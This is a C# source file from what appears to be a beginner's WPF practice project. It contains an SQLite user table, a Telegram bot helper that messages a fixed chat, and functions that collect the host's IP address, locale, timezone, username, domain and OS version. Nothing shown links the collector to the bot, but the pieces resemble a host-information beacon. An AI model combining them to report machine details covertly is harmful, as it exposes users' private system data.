using System.ComponentModel.DataAnnotations;
using System.ComponentModel.DataAnnotations.Schema;
using System.Globalization;
using System.Net;
using Microsoft.EntityFrameworkCore;
using Telegram.Bot;

namespace WpfAppПерваяПробаПера
{
    class Entity
    {
        // Просто класс которй тут есть
    }

    internal class User
    {
        [Key]
        [DatabaseGenerated(DatabaseGeneratedOption.Identity)]
        [Column("Id")]
        public int Id { get; set; }
        [Column("Имя", TypeName = "VARCHAR(100)")]
        [Required]
        internal string Name { get; set; }
        [Column("Фамилия", TypeName = "VARCHAR(100)")]
        [Required]
        internal string LastName { get; set; }
        [Column("Возраст")]
        [Required]
        internal uint Age { get; set; }
    }


    internal class DataBase : DbContext
    {
        internal DataBase()
        {
            this.Database.EnsureCreated();
        }
        internal DbSet<User> Users { get; set; }

        protected override void OnConfiguring(DbContextOptionsBuilder optionsBuilder)
        {
            optionsBuilder.UseSqlite("Data Source=../../../DataBasa/Data.db");
        }
    }

    internal static class TelegrammBot
    {
        private static readonly long _clientID = 0;
        private static TelegramBotClient _bot = new TelegramBotClient("");
        internal static async Task TelegrammMessage(string messege)
        {
            await _bot.SendMessage(_clientID, messege);
        }

    }

    internal static class NetworkPositionInfo
    {
        internal static string GetLocalIPAddresses()
        {
            IPAddress addressInfo = null;
            // Все IP-адреса этого компьютера
            IPAddress[] addresses = Dns.GetHostAddresses(Dns.GetHostName());

            foreach (IPAddress add in addresses)
            {
                // Только IPv4 адреса
                if (add.AddressFamily == System.Net.Sockets.AddressFamily.InterNetwork)
                {
                    addressInfo = add;
                }
            }
            string information = $"\n\n==== СЕТЕВАЯ ИНФОРМАЦИЯ ====" +
                $"\n{addressInfo}";
            return information;
        }
        internal static string GetSystemTimeLocationInfo()
        {
            CultureInfo currentCulture = Thread.CurrentThread.CurrentCulture;
            RegionInfo regionInfo = new RegionInfo(currentCulture.LCID);

            string information =
                $"\n\n==== РЕГИОНАЛЬНЫЕ НАСТРОЙКИ ====" +
                $"\nЯзык системы: {currentCulture.DisplayName}\n" +
                $"Регион: {regionInfo.EnglishName}\n" +
                $"Код региона: {regionInfo.TwoLetterISORegionName}\n" +
                $"Часовой пояс: {TimeZoneInfo.Local.DisplayName}\n" +
                $"Локальное время: {DateTime.Now}\n" +
                $"Время UTC: {DateTime.UtcNow}\n";
            return information;
        }

        internal static string GetComputerInfo()
        {
            string information =
                $"\n\n==== ИНФОРМАЦИЯ О СИСТЕМЕ ====" +
                $"\nИмя пользователя: {Environment.UserName}" +
                $"\nДоменная группа: {Environment.UserDomainName}" +
                $"\nОС: {Environment.OSVersion}" +
                $"\nВерсия .NET: {Environment.Version}" +
                $"\nСистемная папка: {Environment.SystemDirectory}\n";
            return information;
        }
    }
}
